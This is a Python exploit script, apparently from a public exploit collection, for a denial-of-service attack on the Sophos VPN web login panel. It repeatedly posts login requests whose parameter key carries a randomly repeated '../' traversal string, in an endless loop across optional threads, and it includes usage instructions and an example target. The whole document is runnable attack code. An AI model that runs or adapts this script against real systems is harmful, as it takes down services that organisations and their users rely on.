#!/usr/bin/python3
import requests
import sys
import random
import threading
# Exploit Title: Sophos VPN Web Panel DoS
# # Date: 6/17/2020
# # Exploit Author: Berk KIRAS
# # Vendor Homepage: https://www.sophos.com/
# # Version:2020 Web Panel
# # Tested on: Apache
#Berk KIRAS PwC - Cyber Security Specialist 
#Sophos VPN Web Portal Denial of Service Vulnerability
#System parse JSON data. If we want to send some JSON with invalid data format 
# for ex. valid -> {"test","test2"} , invalid -> {"test",PAYLOAD"test2"} 
#The system can not parse this data fastly and service down
#payload_option2 ="../../../../../../../../../FILE./FILE"


def send_req():
        cnt = random.randint(9,22)
        payload= "../"*cnt+'{FILE}'
        my_datas_params = {"username":"test",
        payload+"password":"admin",
        "cookie":"0",
        "submit":"<div class=\"login_screen_login_button_left\"></div><div class=\"login_screen_login_button_middle\">Oturum Aç</div><div class=\"login_screen_login_button_right\"></div>",
        "language":"turkish",
        "browser_id":"kbgacsyo-q4j5o7lr70e"}
    
            # You should change some values into the headers
        Host_addr = sys.argv[2]
        Origin=sys.argv[1]+"://"+sys.argv[2]
        Referrer=sys.argv[1]+"://"+sys.argv[2]
        Cookie=sys.argv[4]
        #Headers
        my_datas_headers ={
            "Host":str(Host_addr),
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
            "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
            "X-Prototype-Version": "1.6.1_rc3",
            "Content-type": "application/json; charset=UTF-8",
            "Origin":Origin,
            "Connection": "close",
            "Referer":Referrer,
            "Cookie":Cookie,
        }
        my_datas_headers2 ={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0",
            "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
            "Accept-Language": "tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "X-Requested-With": "XMLHttpRequest",
            "X-Prototype-Version": "1.6.1_rc3",
            "Content-type": "application/json; charset=UTF-8",
            "Connection": "close",
        }
        #If you want to edit and add headers some headers added
        s = requests.session()
       #if you want simple-> headers={'User-Agent': 'Mozilla', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}
        s.headers.update(my_datas_headers2)
        print(s.headers.items)
        r = s.post(sys.argv[1]+"://"+sys.argv[2]+sys.argv[3],data=my_datas_params)
        
        return s
 
def main():
    if(len(sys.argv) < 6): 
        print("Usage:1) Implement your headers \n2)change payload if you want \n3) exploit.py <http/https> <domain> <page> <cookie-val> <Thread(1-10)> \nExample-> exploit.py http vpn.test.com /test/index.plx 2\nCoded by b3rkk1r4s | PwC Cyber")
        sys.exit(0)
    else:
        try:
                req_count=0  
                while(True):
                    if(int(sys.argv[5])==1):
                        resp = send_req()
                        req_count=req_count+1
                        print("Sending Requests... Count: "+str(req_count))
                    else:
                        threads = int(sys.argv[5])
                        jobs = []
                        for i in range(0, threads):
                            out_list = list()
                            thread = threading.Thread(target=send_req)
                            jobs.append(thread)
                        for j in jobs:
                            j.start()
                        print("Jobs Started!")
                        # Ensure all of the threads have finished
                        for j in jobs:
                            j.join()
                        
        except Exception:
            print(Exception)

main()
